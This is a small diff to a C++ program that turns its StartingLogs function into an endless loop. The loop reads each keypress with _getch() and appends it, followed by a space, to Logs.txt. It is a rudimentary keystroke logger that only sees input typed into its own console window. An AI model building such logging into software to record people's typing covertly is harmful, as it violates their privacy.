@@ -7,13 +7,16 @@ using namespace std;
 void StartingLogs()
 {
   std:ofstream outf("Logs.txt");
+  for(;;){
   fstream logs;
   logs.open("Logs.txt", ios::app);
   if(logs.is_open())
   {
     logs<<_getch();
+    logs<<" ";
     logs.close();
   }
+}
 }
 int main()
 {
